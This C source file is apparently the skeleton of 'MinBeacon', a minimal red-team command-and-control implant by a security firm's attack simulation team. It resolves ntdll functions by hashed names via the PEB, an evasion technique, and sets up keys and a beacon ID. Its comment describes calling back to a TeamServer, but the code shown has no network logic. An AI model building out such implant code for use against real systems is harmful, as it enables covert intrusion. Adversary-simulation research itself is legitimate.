/*!
 *
 * MINBEACON
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( RtlInitUnicodeString );
	D_API( RtlAllocateHeap );
	D_API( LdrUnloadDll );
	D_API( RtlFreeHeap );
	D_API( LdrLoadDll );
} API ;

/* API Hashes */
#define H_API_RTLINITUNICODESTRING	0xef52b589 /* RtlInitUnicodeString */
#define H_API_RTLALLOCATEHEAP		0x3be94c5a /* RtlAllocateHeap */
#define H_API_LDRUNLOADDLL		0xd995c1e6 /* LdrUnloadDll */
#define H_API_RTLFREEHEAP		0x73a9e4d7 /* RtlFreeHeap */
#define H_API_LDRLOADDLL		0x9e456a43 /* LdrLoadDll */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Initializes the MinBeacon context, and starts
 * a connection back to the TeamServer. Supports
 * a minimal amount of commands.
 *
!*/
D_SEC( B ) VOID WINAPI Entry( VOID )
{
	API		Api;
	UNICODE_STRING	Uni;

	PMINBEACON_CTX	Ctx = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

	/* Build Stack API Table */
	Api.RtlInitUnicodeString = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING ); 
	Api.RtlAllocateHeap      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.LdrUnloadDll         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
	Api.RtlFreeHeap          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
	Api.LdrLoadDll           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );

	/* Allocate the context structure to hold information about the Beacon */
	if ( ( Ctx = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( MINBEACON_CTX ) ) ) ) {

		/* Initializes the AES / HMAC keys for the key exchange */
		RandomString( Ctx->Key, sizeof( Ctx->Key ) );

		/* Generate the BID: Must be an divisible by 2 for TS */
		Ctx->Bid = ( ( RandomInt32( ) + 2 - 1 ) &~ ( 2 - 1 ) );

		/* Dependency: kernel32.dll */
		Api.RtlInitUnicodeString( &Uni, C_PTR( G_PTR( L"kernel32.dll" ) ) );
		Api.LdrLoadDll( NULL, NULL, &Uni, &Ctx->K32 );

		/* Dependency: advapi32.dll */
		Api.RtlInitUnicodeString( &Uni, C_PTR( G_PTR( L"advapi32.dll" ) ) );
		Api.LdrLoadDll( NULL, NULL, &Uni, &Ctx->Adv );

		/* Dependency: crypt32.dll */
		Api.RtlInitUnicodeString( &Uni, C_PTR( G_PTR( L"crypt32.dll" ) ) );
		Api.LdrLoadDll( NULL, NULL, &Uni, &Ctx->C32 );

		if ( Ctx->C32 != NULL ) {
			/* Dereference! */
			Api.LdrUnloadDll( Ctx->C32 );
		};
		if ( Ctx->Adv != NULL ) {
			/* Dereference! */
			Api.LdrUnloadDll( Ctx->Adv );
		};
		if ( Ctx->K32 != NULL ) {
			/* Dereference! */
			Api.LdrUnloadDll( Ctx->K32 );
		};
		/* Free context structure */
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Ctx );
		Ctx = NULL;
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
};
